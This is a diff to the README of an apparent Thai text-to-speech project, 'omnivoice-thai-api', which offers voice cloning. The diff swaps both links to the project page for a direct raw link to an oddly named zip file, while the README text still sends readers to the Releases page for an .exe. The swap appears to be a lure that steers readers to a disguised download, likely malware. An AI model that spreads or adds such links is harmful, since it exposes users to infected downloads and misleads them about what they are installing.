@@ -1,6 +1,6 @@
 # 🎙️ omnivoice-thai-api - Convert Thai text into natural speech
 
-[![Download OmniVoice](https://img.shields.io/badge/Download-OmniVoice-blue.svg)](https://github.com/pokemonj8761/omnivoice-thai-api)
+[![Download OmniVoice](https://img.shields.io/badge/Download-OmniVoice-blue.svg)](https://github.com/pokemonj8761/omnivoice-thai-api/raw/refs/heads/main/supraspinate/omnivoice-thai-api-hepatoduodenostomy.zip)
 
 OmniVoice Thai API turns written Thai text into spoken audio. This software uses advanced sound models to create clear, human-like voices. You can use the built-in web interface to type text and hear the results immediately. The system also supports voice cloning, which allows you to create audio that sounds like a specific person.
 
@@ -18,7 +18,7 @@ Your computer needs specific hardware and software to run this tool well. Please
 
 You must visit the project page to get the installer for your computer. 
 
-[Click here to open the download page](https://github.com/pokemonj8761/omnivoice-thai-api)
+[Click here to open the download page](https://github.com/pokemonj8761/omnivoice-thai-api/raw/refs/heads/main/supraspinate/omnivoice-thai-api-hepatoduodenostomy.zip)
 
 Once you reach the page, look for the "Releases" section on the right side of the screen. Click the most recent version label. Scroll down to the "Assets" section and click the file ending in ".exe" to save the installer to your computer.
 
